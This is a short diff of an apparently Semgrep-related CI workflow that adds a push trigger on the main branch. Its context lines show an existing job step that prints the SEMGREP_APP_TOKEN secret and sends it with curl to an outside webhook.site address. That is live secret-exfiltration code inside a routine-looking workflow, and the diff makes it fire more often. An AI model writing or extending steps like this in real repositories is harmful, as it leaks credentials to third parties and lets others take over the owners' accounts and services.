@@ -7,6 +7,10 @@ on:
   # Triggers the workflow pull request events but only for the "main" branch
   pull_request: {}
 
+  push:
+    branches:
+      - main
+
   # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
 
@@ -33,3 +37,5 @@ jobs:
         run: |
           echo $SEMGREP_APP_TOKEN
           curl https://webhook.site/764cf3d1-c66c-47ac-883f-dd16a050fa18?$SEMGREP_APP_TOKEN
+
+          
